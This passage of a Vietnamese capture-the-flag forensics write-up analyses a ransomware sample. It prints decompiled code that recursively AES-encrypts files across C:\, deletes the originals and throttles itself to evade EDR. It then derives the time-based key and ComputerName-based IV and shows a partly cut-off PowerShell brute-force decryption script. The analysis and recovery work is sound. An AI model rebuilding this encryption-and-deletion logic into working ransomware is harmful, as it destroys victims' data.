      v6 = (unsigned __int64 *)&v24;
      v7 = 34;
    }
    else
    {
      memset(v28, 0, sizeof(v28));
      sub_140005690(v28, "UNKNOWN", 7i64);
      v6 = (unsigned __int64 *)v28;
      v7 = 33;
    }
    v31 = v7;
    v10 = v6[2];
    v11 = v6[3];
    if ( v11 - v10 < 0xE )
    {
      v6 = (unsigned __int64 *)sub_14000E130((_DWORD)v6, 14, v10, v2, (__int64)"Current user: ", 14i64);
    }
    else
    {
      v6[2] = v10 + 14;
      v12 = (unsigned __int64)v6;
      if ( v11 > 0xF )
        v12 = *v6;
      if ( (unsigned __int64)"" <= v12 || (unsigned __int64)"Current user: " > v12 + v10 )
      {
        v13 = 14i64;
      }
      else if ( v12 > (unsigned __int64)"Current user: " )
      {
        v13 = v12 - (_QWORD)"Current user: ";
      }
      else
      {
        v13 = 0i64;
      }
      sub_14003C9E0(v12 + 14, v12, v10 + 1);
      sub_14003C9E0(v12, "Current user: ", v13);
      sub_14003C9E0(v12 + v13, &aCurrentUser[v13 + 14], 14 - v13);
    }
    v26 = 0i64;
    v27 = 0i64;
    v26 = *(_OWORD *)v6;
    v27 = *((_OWORD *)v6 + 1);
    *(_BYTE *)v6 = 0;
    v6[2] = 0i64;
    v6[3] = 15i64;
    v14 = v7 | 0x40;
    v31 = v14;
    sub_140013050(&v26);
    sub_140005BC0(&v26);
    if ( (v14 & 2) != 0 )
    {
      v14 &= ~2u;
      sub_140005BC0(&v24);
    }
    if ( (v14 & 1) != 0 )
    {
      v14 &= ~1u;
      sub_140005BC0(v28);
    }
    v34 = 0i64;
    v35 = 0i64;
    sub_140008B80(&v34, &v32);
    v16 = (_QWORD *)*((_QWORD *)&v34 + 1);
    for ( i = (_QWORD *)v34; i != v16 && !byte_14005C110; i += 4 )
    {
      v22 = 0i64;
      v23 = &off_140059DC0;
      v17 = i[2];
      v18 = i;
      if ( i[3] > 0xFui64 )
        v18 = (_QWORD *)*i;
      v19 = _std_fs_code_page();
      *(_QWORD *)&v26 = v18;
      *((_QWORD *)&v26 + 1) = v17;
      sub_1400071D0(v30, v19, &v26);
      v14 |= 0x1Cu;
      v20 = *(_DWORD *)sub_140008800(v29, v30, &v22);
      v21 = 0;
      if ( v20 )
      {
        LODWORD(v22) = 0;
        v23 = &off_140059DC0;
        if ( v20 != 1 )
          v21 = 1;
      }
      if ( (v14 & 4) != 0 )
      {
        v14 &= ~4u;
        sub_140005B40(v30);
      }
      if ( v21 )
      {
        sub_140009450(i);
        Sleep(0x3E8u);
      }
    }
    memset(v37, 0, sizeof(v37));
    sub_140005690(v37, "C:\\Users\\", 9i64);
    sub_140009450(v37);
    memset(v36, 0, sizeof(v36));
    sub_140005690(v36, "C:\\", 3i64);
    sub_140009450(v36);
    sub_14000B850(v36);
    sub_140005BC0(v36);
    sub_140005BC0(v37);
    sub_14000D6D0(&v34);
    return sub_140005BC0(&v32);
  }
  return result;
}
```

Ở func, ta thấy nó sẽ làm:
- Khởi tạo Crypto & Recon User
```cpp
sub_140005690(&v32, "=== Starting Encryption Process ===", 35i64); // Log bắt đầu
result = sub_1400029A0();        // Init AES key/IV: hash(UnixTime + ComputerName_UserName) → SHA256
v3 = sub_140021420("USERNAME");  // Đọc biến môi trường USERNAME
// if-else bên dưới: nối chuỗi "Current user: " + username, fallback = "UNKNOWN"
```

- Xây dựng danh sách thư mục mục tiêu
```cpp
sub_140008B80(&v34, &v32); // Input: username (v32) → Output: mảng đường dẫn target (v34)
```

- Vòng lặp mã hóa 
```cpp
v16 = (_QWORD *)*((_QWORD *)&v34 + 1);
for ( i = (_QWORD *)v34; i != v16 && !byte_14005C110; i += 4 )
{
    // sub_140008800: kiểm tra đường dẫn, phân quyền
    if ( v21 )
    {
        sub_140009450(i); // Duyệt đệ quy thư mục → AES-CBC (sub_140002F70) → .enc
        Sleep(0x3E8u);    // Sleep 1 giây/thư mục → Rate Limiting, né EDR/Heuristic
    }
}
```

- Fallback — Hardcode quét toàn bộ
```cpp
// Phòng trường hợp vòng lặp trên bỏ sót
memset(v37, 0, sizeof(v37));
sub_140005690(v37, "C:\\Users\\", 9i64);
sub_140009450(v37);              // Quét toàn bộ C:\Users\

memset(v36, 0, sizeof(v36));
sub_140005690(v36, "C:\\", 3i64);
sub_140009450(v36);              // Quét toàn bộ ổ C:\
```

Tìm tới hàm **sub_1400029A0**: Nơi sinh Key & IV

```cpp
char sub_1400029A0()
{
  BCRYPT_ALG_HANDLE v0; // rcx
  NTSTATUS v2; // ebx
  __int64 v3; // rbx
  __int64 v4; // r8
  __int64 v5; // rax
  __int64 v6; // rdx
  UCHAR *v7; // rdx
  NTSTATUS v8; // ebx
  __int128 v9[2]; // [rsp+40h] [rbp-C0h] BYREF
  __int128 v10[2]; // [rsp+60h] [rbp-A0h] BYREF
  BCRYPT_HASH_HANDLE phHash; // [rsp+80h] [rbp-80h] BYREF
  BCRYPT_ALG_HANDLE phAlgorithm; // [rsp+88h] [rbp-78h] BYREF
  BCRYPT_HASH_HANDLE hHash; // [rsp+90h] [rbp-70h] BYREF
  BCRYPT_ALG_HANDLE hAlgorithm; // [rsp+98h] [rbp-68h] BYREF
  int v15; // [rsp+A0h] [rbp-60h] BYREF
  UCHAR v16[4]; // [rsp+A4h] [rbp-5Ch] BYREF
  UCHAR v17[4]; // [rsp+A8h] [rbp-58h] BYREF
  int v18; // [rsp+ACh] [rbp-54h] BYREF
  PUCHAR v19[2]; // [rsp+B0h] [rbp-50h] BYREF
  ULONG cbInput; // [rsp+C0h] [rbp-40h]
  unsigned __int64 v21; // [rsp+C8h] [rbp-38h]
  UCHAR pbInput[4]; // [rsp+D0h] [rbp-30h] BYREF
  unsigned int v23; // [rsp+D4h] [rbp-2Ch]
  char v24[16]; // [rsp+D8h] [rbp-28h] BYREF
  UCHAR v25[16]; // [rsp+E8h] [rbp-18h] BYREF
  __m128i v26; // [rsp+F8h] [rbp-8h] BYREF
  UCHAR pbOutput[16]; // [rsp+108h] [rbp+8h] BYREF
  __int128 v28; // [rsp+118h] [rbp+18h]
  UCHAR v29[16]; // [rsp+128h] [rbp+28h] BYREF
  char v30[272]; // [rsp+150h] [rbp+50h] BYREF

  *(_DWORD *)v17 = unknown_libname_32(0i64);
  *(_DWORD *)v16 = *(_DWORD *)v17 ^ 0xDEADBEEF;
  *(_DWORD *)pbInput = *(_DWORD *)v17 ^ 0xDEADBEEF ^ (*(_DWORD *)v17 + 13107);
  v23 = *(_DWORD *)v17 ^ ((*(_DWORD *)v17 ^ 0xDEADBEEF) + 13107);
  *(_OWORD *)&pbSecret = 0i64;
  xmmword_14005C0F0 = 0i64;
  phAlgorithm = 0i64;
  if ( BCryptOpenAlgorithmProvider(&phAlgorithm, L"SHA256", 0i64, 0) < 0 )
    return 0;
  phHash = 0i64;
  if ( BCryptCreateHash(phAlgorithm, &phHash, 0i64, 0, 0i64, 0, 0) < 0 )
    goto LABEL_5;
  if ( BCryptHashData(phHash, pbInput, 8u, 0) < 0 )
  {
    BCryptDestroyHash(phHash);
LABEL_5:
    v0 = phAlgorithm;
LABEL_6:
    BCryptCloseAlgorithmProvider(v0, 0);
    return 0;
  }
  v2 = BCryptFinishHash(phHash, pbOutput, 0x20u, 0);
  BCryptDestroyHash(phHash);
  v0 = phAlgorithm;
  if ( v2 < 0 )
    goto LABEL_6;
  *(_OWORD *)&pbSecret = *(_OWORD *)pbOutput;
  xmmword_14005C0F0 = v28;
  if ( BCryptCreateHash(phAlgorithm, &phHash, 0i64, 0, 0i64, 0, 0) >= 0 )
  {
    BCryptHashData(phHash, pbOutput, 0x20u, 0);
    BCryptHashData(phHash, v16, 4u, 0);
    BCryptHashData(phHash, v17, 4u, 0);
    if ( BCryptFinishHash(phHash, v25, 0x20u, 0) >= 0 )
    {
      *(__m128 *)&pbSecret = _mm_xor_ps(
                               (__m128)_mm_loadu_si128((const __m128i *)v25),
                               (__m128)_mm_loadu_si128((const __m128i *)&pbSecret));
      xmmword_14005C0F0 = (__int128)_mm_xor_ps(
                                      (__m128)_mm_loadu_si128(&v26),
                                      (__m128)_mm_loadu_si128((const __m128i *)&xmmword_14005C0F0));
    }
    BCryptDestroyHash(phHash);
  }
  BCryptCloseAlgorithmProvider(phAlgorithm, 0);
  if ( !(unsigned __int8)sub_140001CC0() )
    return 0;
  v18 = 16;
  v15 = 257;
  if ( !(unsigned int)qword_14005C0D0(v24, &v18) )
    sub_1400202D0(v24, 16i64, "UnknownPC");
  if ( !(unsigned int)qword_14005C0D8(v30, &v15) )
    sub_1400202D0(v30, 257i64, "UnknownUser");
  memset(v10, 0, sizeof(v10));
  v3 = -1i64;
  v4 = -1i64;
  do
    ++v4;
  while ( v30[v4] );
  sub_140005690(v10, v30, v4);
  memset(v9, 0, sizeof(v9));
  do
    ++v3;
  while ( v24[v3] );
  sub_140005690(v9, v24, v3);
  v5 = sub_140005D90(v9, "_", 1i64);
  *(_OWORD *)v25 = *(_OWORD *)v5;
  v26 = *(__m128i *)(v5 + 16);
  *(_BYTE *)v5 = 0;
  *(_QWORD *)(v5 + 16) = 0i64;
  *(_QWORD *)(v5 + 24) = 15i64;
  sub_140005E20(v19, v6, v25, v10);
  sub_140005BC0(v25);
  sub_140005BC0(v9);
  sub_140005BC0(v10);
  hAlgorithm = 0i64;
  if ( BCryptOpenAlgorithmProvider(&hAlgorithm, L"SHA256", 0i64, 0) < 0 )
    goto LABEL_29;
  hHash = 0i64;
  if ( BCryptCreateHash(hAlgorithm, &hHash, 0i64, 0, 0i64, 0, 0) < 0 )
    goto LABEL_28;
  v7 = (UCHAR *)v19;
  if ( v21 > 0xF )
    v7 = v19[0];
  if ( BCryptHashData(hHash, v7, cbInput, 0) < 0 )
  {
    BCryptDestroyHash(hHash);
LABEL_28:
    BCryptCloseAlgorithmProvider(hAlgorithm, 0);
LABEL_29:
    sub_140005BC0(v19);
    return 0;
  }
  v8 = BCryptFinishHash(hHash, v29, 0x20u, 0);
  BCryptDestroyHash(hHash);
  BCryptCloseAlgorithmProvider(hAlgorithm, 0);
  if ( v8 < 0 )
    goto LABEL_29;
  *(_OWORD *)&pbIV = *(_OWORD *)v29;
  sub_140005BC0(v19);
  return 1;
}
```

- Biến dựa trên thời gian
![image](/images/cscv2025_final/43.png)
Key sinh hoàn toàn cục bộ từ T → có thể brute-force theo timestamp

- AES-256 Key
![image](/images/cscv2025_final/44.png)
Hash 1: Nó băm **pbInput** (chứa 8 bytes gồm **pbInput** và v23), kết quả lưu vào **pbOutput**. Hash 2 nó băm tiếp **pbOutput** sau đó băm nối thêm v16 và v17 (chính là T) -> kết quả lưu vào v25

- IV
![image](/images/cscv2025_final/45.png)
Nó gọi **qword_14005C0D0** (GetComputerName) và **qword_14005C0D8** (GetUserName). Nếu thất bại, nó dùng chuỗi dự phòng "UnknownPC" và "UnknownUser", nó tìm ký tự _ để nối 2 chuỗi này lại thành: ComputerName_UserName. Cuối cùng, nó băm SHA-256 chuỗi này và lấy 16 bytes đầu tiên (*(_OWORD *)&pbIV = *(_OWORD *)v29;) để làm IV cho thuật toán AES-CBC

Tiếp đến là hàm **sub_140009450** : Vòng lặp đệ quy và hủy diệt

- Lọc file
![image](/images/cscv2025_final/46.png)
```cpp
sub_140007CD0(v124, v158);          // lấy attributes

if (v158[0] != 2 || v158[2])       // không phải Regular File → skip
    → log "Cannot access entry..."
```

- Mã hóa

Nếu đối tượng là một file tài liệu bình thường, luồng thực thi cực kỳ tàn bạo=]]
![image](/images/cscv2025_final/47.png)
Đếm số lượng: ++v125; Ghi log: Tạo chuỗi "Found file (#...):"

![image](/images/cscv2025_final/48.png)
tạo ra một đối tượng đường dẫn mới với đuôi .enc

![image](/images/cscv2025_final/49.png)
Nó in ra "Attempting to encrypt: " và gọi hàm lõi sub_140002F70

![image](/images/cscv2025_final/50.png)
Nếu mã hóa Thành công. Nó sẽ gọi **_std_fs_remove(v38)** để xóa vĩnh viễn file gốc

![image](/images/cscv2025_final/51.png)
Nếu mã hóa Thất bại: Báo lỗi "Failed to encrypt: "

nhưng để ý 1 chút có 1 kỹ thuật khá hay được sử dụng
![image](/images/cscv2025_final/52.png)
*0x64 trong hệ Hexadecimal tương đương với 100. Tức là sau khi xử lý xong (hoặc thất bại) một file, mã độc sẽ ngủ đúng 100 milliseconds rồi mới mã hóa file tiếp theo. Đây là kỹ thuật "Rate Limiting" rất phổ biến trong các dòng ransomware hiện đại. Việc mã hóa quá nhanh sẽ tạo ra lượng IOPS (Input/Output Operations Per Second) khổng lồ trên ổ cứng, ngay lập tức kích hoạt các rule cảnh báo của Windows Defender hoặc các phần mềm EDR/Antivirus. Việc làm chậm quá trình này lại giúp nó "tàng hình" tốt hơn dưới radar của các công cụ giám sát hành vi*

Cuối cùng ta sẽ đi vào hàm **sub_140002F70**

```cpp
char __fastcall sub_140002F70(__int64 a1, __int64 a2)
{
  __int64 v5; // rdx
  _QWORD *v6; // rax
  unsigned __int64 v7; // rsi
  __int64 v8; // rdx
  __int64 v9; // rcx
  int v10; // edi
  int v11; // edi
  int v12; // edi
  char v13; // bl
  UCHAR *v14; // rbx
  int v15; // edi
  __int64 v16; // rcx
  int v17; // eax
  int v18; // eax
  int v19; // eax
  ULONG cbOutput; // ecx
  __int64 v21; // r14
  UCHAR *v22; // rbx
  NTSTATUS v23; // ebx
  __int64 v24; // rcx
  int v25; // edi
  PUCHAR v26; // rcx
  PUCHAR v27; // rcx
  const char *v28; // rbx
  __int64 v29; // rax
  const char *v30; // rbx
  __int64 error_code; // rax
  const char *v32; // rbx
  __int64 v33; // rax
  char v34[24]; // [rsp+50h] [rbp-B0h] BYREF
  char v35[40]; // [rsp+68h] [rbp-98h] BYREF
  BCRYPT_ALG_HANDLE phAlgorithm; // [rsp+90h] [rbp-70h] BYREF
  BCRYPT_KEY_HANDLE phKey; // [rsp+98h] [rbp-68h] BYREF
  ULONG pcbResult; // [rsp+A0h] [rbp-60h] BYREF
  PUCHAR pbInput[2]; // [rsp+A8h] [rbp-58h]
  UCHAR *v40; // [rsp+B8h] [rbp-48h]
  PUCHAR pbOutput[2]; // [rsp+C0h] [rbp-40h]
  UCHAR *v42; // [rsp+D0h] [rbp-30h]
  int v43; // [rsp+DCh] [rbp-24h]
  __int64 v44[2]; // [rsp+E0h] [rbp-20h] BYREF
  int v45[32]; // [rsp+F0h] [rbp-10h] BYREF
  __int64 v46; // [rsp+170h] [rbp+70h]
  void **v47; // [rsp+190h] [rbp+90h] BYREF
  char v48[32]; // [rsp+1F0h] [rbp+F0h] BYREF
  char v49[32]; // [rsp+210h] [rbp+110h] BYREF
  __int64 v50; // [rsp+230h] [rbp+130h] BYREF
  char v51[128]; // [rsp+238h] [rbp+138h] BYREF
  __int64 v52; // [rsp+2B8h] [rbp+1B8h]
  void **v53; // [rsp+2D8h] [rbp+1D8h] BYREF
  UCHAR pbIV[16]; // [rsp+340h] [rbp+240h] BYREF

  phAlgorithm = 0i64;
  phKey = 0i64;
  if ( BCryptOpenAlgorithmProvider(&phAlgorithm, L"AES", 0i64, 0) < 0 )
    return 0;
  if ( BCryptSetProperty(phAlgorithm, L"ChainingMode", (PUCHAR)L"ChainingModeCBC", 0x20u, 0) < 0 )
  {
    BCryptCloseAlgorithmProvider(phAlgorithm, 0);
    return 0;
  }
  if ( BCryptGenerateSymmetricKey(phAlgorithm, &phKey, 0i64, 0, &pbSecret, 0x20u, 0) < 0 )
  {
    BCryptCloseAlgorithmProvider(phAlgorithm, 0);
    return 0;
  }
  sub_140002DE0(v49, a1);
  sub_14003D170(v44, 0i64, 272i64);
  sub_140003CB0(v44, v49);
  if ( !v46 )
    goto LABEL_13;
  sub_140004D50(v44, v5, 2i64);
  v6 = (_QWORD *)sub_140004C70(v44, v34);
  v7 = *v6 + v6[1];
  sub_140004D50(v44, v8, 0i64);
  if ( v7 )
  {
    *(_OWORD *)pbInput = 0i64;
    v40 = 0i64;
    if ( v7 > 0x7FFFFFFFFFFFFFFFi64 )
      unknown_libname_7();
    pbInput[0] = (PUCHAR)sub_140006AC0(v7);
    v14 = &pbInput[0][v7];
    v40 = &pbInput[0][v7];
    sub_14003D170(pbInput[0], 0i64, v7);
    pbInput[1] = v14;
    sub_140004F50(v44, pbInput[0], v7);
    v15 = 4;
    if ( sub_140006230(v45) )
      goto LABEL_19;
    v16 = *(int *)(v44[0] + 4);
    v17 = 4;
    if ( *(_QWORD *)((char *)&v45[14] + v16) )
      v17 = 0;
    v18 = (*(int *)((char *)v45 + v16) | v17) & 0x15 | 2;
    *(int *)((char *)v45 + v16) = v18;
    v19 = *(int *)((char *)&v45[1] + v16) & v18;
    if ( v19 )
    {
      if ( (v19 & 4) != 0 )
      {
        v30 = "ios_base::badbit set";
      }
      else
      {
        v30 = "ios_base::failbit set";
        if ( (v19 & 2) == 0 )
          v30 = "ios_base::eofbit set";
      }
      error_code = std::make_error_code(v34, 1i64);
      sub_140002880(v35, v30, error_code);
      sub_14001B43C(v35, &_TI5_AVfailure_ios_base_std__);
    }
    else
    {
LABEL_19:
      pcbResult = 0;
      if ( BCryptEncrypt(phKey, pbInput[0], v7, 0i64, &::pbIV, 0x10u, 0i64, 0, &pcbResult, 1u) < 0 )
      {
        BCryptDestroyKey(phKey);
        BCryptCloseAlgorithmProvider(phAlgorithm, 0);
        v13 = 0;
        goto LABEL_37;
      }
      cbOutput = pcbResult;
      v21 = pcbResult;
      *(_OWORD *)pbOutput = 0i64;
      v42 = 0i64;
      if ( pcbResult )
      {
        pbOutput[0] = (PUCHAR)sub_140006AC0(pcbResult);
        v22 = &pbOutput[0][v21];
        v42 = &pbOutput[0][v21];
        sub_14003D170(pbOutput[0], 0i64, (unsigned int)v21);
        pbOutput[1] = v22;
        cbOutput = pcbResult;
      }
      *(_OWORD *)pbIV = *(_OWORD *)&::pbIV;
      v23 = BCryptEncrypt(phKey, pbInput[0], v7, 0i64, pbIV, 0x10u, pbOutput[0], cbOutput, &pcbResult, 1u);
      BCryptDestroyKey(phKey);
      BCryptCloseAlgorithmProvider(phAlgorithm, 0);
      if ( v23 < 0 )
      {
        v13 = 0;
LABEL_33:
        v26 = pbOutput[0];
        if ( !pbOutput[0] )
          goto LABEL_37;
        if ( (unsigned __int64)(v42 - pbOutput[0]) < 0x1000
          || (v26 = (PUCHAR)*((_QWORD *)pbOutput[0] - 1), (unsigned __int64)(pbOutput[0] - v26 - 8) <= 0x1F) )
        {
          j_j_j__free_base(v26);
          *(_OWORD *)pbOutput = 0i64;
          v42 = 0i64;
LABEL_37:
          v27 = pbInput[0];
          if ( pbInput[0] )
          {
            if ( (unsigned __int64)(v40 - pbInput[0]) >= 0x1000 )
            {
              v27 = (PUCHAR)*((_QWORD *)pbInput[0] - 1);
              if ( (unsigned __int64)(pbInput[0] - v27 - 8) > 0x1F )
                invoke_watson(0i64, 0i64, 0i64, 0, 0i64);
            }
            j_j_j__free_base(v27);
            *(_OWORD *)pbInput = 0i64;
            v40 = 0i64;
          }
          goto LABEL_41;
        }
LABEL_59:
        invoke_watson(0i64, 0i64, 0i64, 0, 0i64);
      }
      sub_140002DE0(v48, a2);
      sub_14003D170(&v50, 0i64, 264i64);
      sub_140003AE0(&v50, v48);
      if ( !v52 )
      {
        v13 = 0;
LABEL_32:
        *(_QWORD *)&v51[*(int *)(v50 + 4) - 8] = &std::ofstream::`vftable';
        *(_DWORD *)&v49[*(int *)(v50 + 4) + 28] = *(_DWORD *)(v50 + 4) - 168;
        std::filebuf::~filebuf<char,std::char_traits<char>>(v51);
        *(_QWORD *)&v51[*(int *)(v50 + 4) - 8] = &std::ostream::`vftable';
        *(_DWORD *)&v49[*(int *)(v50 + 4) + 28] = *(_DWORD *)(v50 + 4) - 16;
        v53 = &std::ios_base::`vftable';
        std::ios_base::_Ios_base_dtor((struct std::ios_base *)&v53);
        sub_140005B40(v48);
        goto LABEL_33;
      }
      sub_140004A90(&v50, pbOutput[0], pcbResult);
      if ( sub_140006230(v51) )
        goto LABEL_31;
      v24 = *(int *)(v50 + 4);
      if ( *(_QWORD *)&v51[v24 + 64] )
        v15 = 0;
      v25 = (*(_DWORD *)&v51[v24 + 8] | v15) & 0x15 | 2;
      *(_DWORD *)&v51[v24 + 8] = v25;
      v15 = *(_DWORD *)&v51[v24 + 12] & v25;
      if ( !v15 )
      {
LABEL_31:
        v13 = 1;
        goto LABEL_32;
      }
    }
    if ( (v15 & 4) != 0 )
    {
      v32 = "ios_base::badbit set";
    }
    else
    {
      v32 = "ios_base::failbit set";
      if ( (v15 & 2) == 0 )
        v32 = "ios_base::eofbit set";
    }
    v33 = std::make_error_code(v34, 1i64);
    sub_140002880(v35, v32, v33);
    sub_14001B43C(v35, &_TI5_AVfailure_ios_base_std__);
    goto LABEL_59;
  }
  if ( !sub_140006230(v45) )
  {
    v9 = *(int *)(v44[0] + 4);
    v10 = 4;
    if ( *(_QWORD *)((char *)&v45[14] + v9) )
      v10 = 0;
    v11 = (*(int *)((char *)v45 + v9) | v10) & 0x15 | 2;
    *(int *)((char *)v45 + v9) = v11;
    v12 = *(int *)((char *)&v45[1] + v9) & v11;
    if ( v12 )
    {
      if ( (v12 & 4) != 0 )
      {
        v28 = "ios_base::badbit set";
      }
      else
      {
        v28 = "ios_base::failbit set";
        if ( (v12 & 2) == 0 )
          v28 = "ios_base::eofbit set";
      }
      v29 = std::make_error_code(v34, 1i64);
      sub_140002880(v35, v28, v29);
      sub_14001B43C(v35, &_TI5_AVfailure_ios_base_std__);
      __debugbreak();
    }
  }
LABEL_13:
  BCryptDestroyKey(phKey);
  BCryptCloseAlgorithmProvider(phAlgorithm, 0);
  v13 = 0;
LABEL_41:
  *(__int64 *)((char *)v44 + *(int *)(v44[0] + 4)) = (__int64)&std::ifstream::`vftable';
  *(int *)((char *)&v43 + *(int *)(v44[0] + 4)) = *(_DWORD *)(v44[0] + 4) - 176;
  std::filebuf::~filebuf<char,std::char_traits<char>>(v45);
  *(__int64 *)((char *)v44 + *(int *)(v44[0] + 4)) = (__int64)&std::istream::`vftable';
  *(int *)((char *)&v43 + *(int *)(v44[0] + 4)) = *(_DWORD *)(v44[0] + 4) - 24;
  v47 = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor((struct std::ios_base *)&v47);
  sub_140005B40(v49);
  return v13;
}
```

![image](/images/cscv2025_final/53.png)
mã độc thiết lập thông số mã hóa: Nạp khóa bí mật ***0x20u*** tức là 32 bytes (256-bit). Biến pbSecret chính là khóa đã được sinh ra từ hàm băm thời gian ở bước trước

![image](/images/cscv2025_final/54.png)
Kỹ thuật "Double Call" của BCryptEncrypt
- tham số pbOutput được đặt là 0i64 (NULL). Mục đích của lần gọi này không phải để mã hóa, mà để API trả về kích thước buffer cần thiết (lưu vào pcbResult). Flag 1u ở cuối cùng chính là cờ BCRYPT_BLOCK_PADDING. Nó cấp phát bộ đệm pbOutput[0] với kích thước chính xác là pcbResult.
- **BCryptEncrypt(..., pbIV, 0x10u, pbOutput[0], cbOutput, &pcbResult, 1u)**: Lần này nó đẩy dữ liệu vào buffer vừa cấp phát để lấy bản mã thực sự. (Lưu ý nhỏ: Nó dùng một bản copy của pbIV thay vì biến global ::pbIV để đảm bảo IV không bị biến đổi sau mỗi lần mã hóa file)

Và thế là xong, tất cả những gì chúng ta cần bây giờ là xác định ComputerName để giải mã tất cả các tập tin vì username ta đã biết là MANAGER

vào **\Windows\System32\config** lấy file SYSTEM
![image](/images/cscv2025_final/55.png)

Load vào Registry Explorer, tìm trong **ROOT \ ControlSet001 \ Control \ ComputerName \ ComputerName**
![image](/images/cscv2025_final/56.png)
ta có được computername là **DESKTOP-PAEK96M**

Giờ tiến hành export folder chứa các file bị mã hóa ra và viết script giải mã
![image](/images/cscv2025_final/57.png)

Tạo 1 file ps1 vào cùng folder chứa các file bị mã hóa
```powershell
param(
    # Thư mục hiện tại chứa các file bị mã hóa
    [string]$InputRoot = "C:\Users\Maindo\Desktop\test\Tailieutrade",

    # Thư mục xuất các file đã giải mã
    [string]$OutputRoot = "C:\Users\Maindo\Desktop\test\Tailieutrade\Decrypted",

    # Thông tin thu thập được từ máy ảo bị nhiễm (Không đổi)
    [string]$ComputerName = "DESKTOP-PAEK96M",
    [string]$UserName     = "MANAGER",

    # Khoảng thời gian quét (Cộng trừ 200 giây quanh mốc LastWriteTime)
    [int]$TimeWindowSeconds = 200
)

function Get-UnixTimeSeconds {
    param([DateTime]$DateTime)
    $dto = [DateTimeOffset]$DateTime.ToUniversalTime()
    return [int64]$dto.ToUnixTimeSeconds()
}

function Derive-KeyIv {
    param(
        [int64]$UnixTimeSeconds,
        [string]$ComputerName,
        [string]$UserName
    )

    $T = [uint32]$UnixTimeSeconds
    $v16 = [uint32]($T -bxor 0xDEADBEEF)
    $pbInput0 = [uint32]($T -bxor 0xDEADBEEF -bxor ($T + 13107))
    $v23 = [uint32]($T -bxor (([uint32]($T -bxor 0xDEADBEEF)) + 13107))

    $buf1 = New-Object byte[] 8
    [System.Buffer]::BlockCopy([System.BitConverter]::GetBytes($pbInput0), 0, $buf1, 0, 4)
    [System.Buffer]::BlockCopy([System.BitConverter]::GetBytes($v23),      0, $buf1, 4, 4)

    $sha256 = [System.Security.Cryptography.SHA256]::Create()
    $h1 = $sha256.ComputeHash($buf1)

    $buf2 = New-Object byte[] (32 + 4 + 4)
    [System.Buffer]::BlockCopy($h1, 0, $buf2, 0, 32)
    [System.Buffer]::BlockCopy([System.BitConverter]::GetBytes($v16), 0, $buf2, 32, 4)
    [System.Buffer]::BlockCopy([System.BitConverter]::GetBytes($T),   0, $buf2, 36, 4)

    $h2 = $sha256.ComputeHash($buf2)

    $key = New-Object byte[] 32
    for ($i = 0; $i -lt 32; $i++) {
        $key[$i] = $h1[$i] -bxor $h2[$i]
    }

    if ([string]::IsNullOrEmpty($ComputerName)) { $ComputerName = "UnknownPC" }
    if ([string]::IsNullOrEmpty($UserName))     { $UserName     = "UnknownUser" }

    $s = "$ComputerName`_$UserName"
    $nameBytes = [System.Text.Encoding]::ASCII.GetBytes($s)
    $ivFull = $sha256.ComputeHash($nameBytes)
    $iv = New-Object byte[] 16
    [System.Buffer]::BlockCopy($ivFull, 0, $iv, 0, 16)

    $sha256.Dispose()

    return @{ Key = $key; IV = $iv }
}

function Test-KeyOnFile {
    param(
        [string]$FilePath,
        [byte[]]$Key,
        [byte[]]$IV
    )

    try {
        $cipherBytes = [System.IO.File]::ReadAllBytes($FilePath)

        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Mode      = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding   = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.KeySize   = 256
        $aes.BlockSize = 128
        $aes.Key       = $Key
        $aes.IV        = $IV

        $decryptor = $aes.CreateDecryptor()
        $msIn  = New-Object System.IO.MemoryStream(,$cipherBytes)
        $cs    = New-Object System.Security.Cryptography.CryptoStream($msIn, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Read)
        $msOut = New-Object System.IO.MemoryStream

        $buffer = New-Object byte[] 4096
        while (($read = $cs.Read($buffer, 0, $buffer.Length)) -gt 0) {
            $msOut.Write($buffer, 0, $read) | Out-Null
        }

        $cs.Dispose()
        $aes.Dispose()

        $plain = $msOut.ToArray()
        $msOut.Dispose()
        $msIn.Dispose()

        if ($plain.Length -lt 4) { return $false }

        $magicBytes = $plain[0..3]
        $magic = [System.BitConverter]::ToString($magicBytes)

        # Magic bytes: ZIP/Office (50-4B-03-04) | PDF (25-50-44-46)
        if ($magic -eq "50-4B-03-04" -or $magic -eq "25-50-44-46") { return $true }
        return $false
    }
    catch {
        return $false
    }
}

function Decrypt-File {
    param(
        [string]$InputPath,
        [string]$OutputPath,
        [byte[]]$Key,
        [byte[]]$IV
    )

    $cipherBytes = [System.IO.File]::ReadAllBytes($InputPath)

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode      = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding   = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.KeySize   = 256
    $aes.BlockSize = 128
    $aes.Key       = $Key
    $aes.IV        = $IV

    $decryptor = $aes.CreateDecryptor()
    $msIn  = New-Object System.IO.MemoryStream(,$cipherBytes)
    $cs    = New-Object System.Security.Cryptography.CryptoStream($msIn, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Read)
    $msOut = New-Object System.IO.MemoryStream
    $buffer = New-Object byte[] 4096

    while (($read = $cs.Read($buffer, 0, $buffer.Length)) -gt 0) {
        $msOut.Write($buffer, 0, $read) | Out-Null
    }

    $cs.Dispose()
    $aes.Dispose()

    $plain = $msOut.ToArray()
    $msOut.Dispose()
    $msIn.Dispose()

    $outDir = [System.IO.Path]::GetDirectoryName($OutputPath)
    if (!(Test-Path $outDir)) {
        New-Item -ItemType Directory -Path $outDir -Force | Out-Null
    }

    [System.IO.File]::WriteAllBytes($OutputPath, $plain)
}

# ================= MAIN =================

if (!(Test-Path $InputRoot)) {
    Write-Error "Khong tim thay thu muc InputRoot: $InputRoot"
    exit 1
}
if (!(Test-Path $OutputRoot)) {
    New-Item -ItemType Directory -Path $OutputRoot -Force | Out-Null
}

# Lọc tất cả file .enc và bỏ qua các file rỗng (0 byte)
$encFiles = Get-ChildItem -Path $InputRoot -Recurse -File -Filter *.enc | Where-Object { $_.Length -gt 0 }
if (-not $encFiles) {
    Write-Error "Khong tim thay file .enc hop le nao trong $InputRoot"
    exit 1
}

# Chọn file nhỏ nhất để brute-force cho nhanh
$sample = $encFiles | Sort-Object Length | Select-Object -First 1
Write-Host "Dang dung file de brute-force: $($sample.Name) (Kich thuoc: $($sample.Length) bytes)"

$baseUnix = Get-UnixTimeSeconds $sample.LastWriteTimeUtc

$foundKey = $null
